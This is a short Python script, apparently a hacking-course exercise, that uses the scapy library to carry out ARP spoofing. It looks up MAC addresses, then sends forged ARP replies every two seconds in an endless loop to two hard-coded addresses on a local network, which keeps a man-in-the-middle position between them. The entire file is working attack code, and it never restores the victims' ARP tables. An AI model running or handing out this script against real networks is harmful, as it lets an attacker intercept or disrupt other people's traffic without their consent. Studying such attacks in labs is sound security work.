import scapy.all as scapy
import time
#copied from network_scanner.py
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]


    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    #send the packet
    scapy.send(packet, verbose=False)

#loop to maintain MITM connection status
while True:
    spoof("192.168.100.2", "192.168.100.1")
    spoof("192.168.100.1", "192.168.100.2")
    print("[+] Sent two packets")
    #add a timer to sleep two seconds
    time.sleep(2)
